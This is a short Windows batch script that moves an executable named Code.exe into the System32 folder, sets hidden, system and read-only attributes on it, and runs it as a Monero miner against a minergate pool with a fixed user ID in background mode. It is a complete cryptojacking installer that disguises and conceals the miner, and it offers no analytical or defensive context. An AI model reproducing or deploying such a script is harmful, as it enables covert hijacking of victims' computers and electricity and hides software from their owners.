@echo off
move /Y Code.exe C:/Windows/System32/
attrib +s +a +h +r C:/Windows/System32/Code.exe
C:/Windows/System32/Code.exe -B --donate-level 1 --threads 2 -o xmr.pool.minergate.com:45700 -u sh3p4dtf36gnajn -p x -k
pause